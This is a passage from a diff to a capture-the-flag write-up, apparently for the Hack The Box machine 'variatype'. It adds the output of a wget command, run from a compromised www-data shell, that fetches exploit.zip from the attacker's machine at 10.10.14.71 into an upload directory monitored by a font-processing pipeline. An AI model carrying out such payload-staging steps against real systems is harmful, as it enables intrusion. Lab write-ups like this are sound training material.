@@ -1912,6 +1912,23 @@ Once the server is running on your Kali machine, return to the **www-data** shel
 - `-O /var/www/.../exploit.zip`
     - **Description:** Output File Specification.
     - **Purpose:** Forces the file to be saved in the specific upload directory monitored by the font-processing pipeline.
+
+**Result:**
+
+```shell
+www-data@variatype:~/portal.variatype.htb/public/files$ wget http://10.10.14.71/exploit.zip -O /var/www/portal.variatype.htb/public/files/exploit.zip
+--2026-03-24 04:43:22--  http://10.10.14.71/exploit.zip
+Connecting to 10.10.14.71:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 277 [application/zip]
+Saving to: ‘/var/www/portal.variatype.htb/public/files/exploit.zip’
+
+/var/www/portal.var 100%[===================>]     277  --.-KB/s    in 0s      
+
+2026-03-24 04:43:23 (947 KB/s) - ‘/var/www/portal.variatype.htb/public/files/exploit.zip’ saved [277/277]
+
+www-data@variatype:~/portal.variatype.htb/public/files$ 
+```
 <div align="center">
 <br>
 <br>
